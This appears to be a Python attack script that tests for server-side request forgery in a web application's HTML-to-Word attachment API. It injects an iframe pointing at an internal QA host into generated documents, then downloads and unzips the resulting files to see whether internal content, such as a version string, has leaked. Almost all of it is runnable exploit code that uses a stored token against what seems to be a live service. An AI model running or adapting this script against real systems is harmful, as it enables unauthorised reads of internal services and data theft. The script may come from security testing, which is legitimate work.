import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','40',H+path,'-H','token: '+T,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='zx'+uuid.uuid4().hex[:8]
INTERNAL='http://integrations.qa.soxhubapp.com/version'
# try other attachable types that likely have no existing attachment
for atype,aid in [('AuditableEntity','92'),('AuditableEntity','93'),('OpsAuditItem','1'),('Test','1'),('Assessment','1')]:
    c,b=post('/api/v1/attachments/html',
       {"html":f'<h1>ZX</h1><iframe src="{INTERNAL}" width="900" height="700"></iframe>',
        "type":"word","attachableType":atype,"attachableId":aid,"fileName":f"zx-{tag}-{atype}{aid}"})
    print(f"  {atype}/{aid}: gen={c} {b[:130].replace(chr(10),' ')}")
    if c!='200': continue
    aid2=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid2}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    print(f"    file={a['file_id']} name={f.get('name')} size={f.get('size')}")
    subprocess.run(['curl','-s','-m','60','-o','/tmp/w.docx',f['url']])
    d=open('/tmp/w.docx','rb').read()
    print(f"    downloaded={len(d)}B magic={d[:4]}")
    try:
        z=zipfile.ZipFile(io.BytesIO(d))
        blob=b''.join(z.read(n) for n in z.namelist() if n.endswith('.xml'))
        txt=blob.decode('utf-8',errors='replace')
        print(f"    entries={len(z.namelist())} v1.16.1={('v1.16.1' in txt)}")
        print(f"    snippet={txt[:200]}")
    except Exception as e:
        print(f"    not zip: {e} head={d[:80]}")
    break
